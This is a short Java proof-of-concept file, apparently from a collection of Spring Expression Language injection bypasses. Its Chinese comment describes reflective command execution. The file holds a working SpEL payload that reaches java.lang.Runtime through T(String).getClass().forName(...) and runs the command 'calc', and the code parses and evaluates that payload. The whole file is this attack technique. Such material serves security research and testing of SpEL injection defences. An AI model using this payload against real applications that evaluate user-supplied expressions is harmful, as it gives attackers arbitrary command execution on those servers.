package PoCAndBypass.NormalBypass;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;


// Runtime.getRuntime().exec() 的反射命令执行
public class ReflectRuntimeBypass {
    public static void main(String[] args) {
        String spel = "T(String).getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"calc\")";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
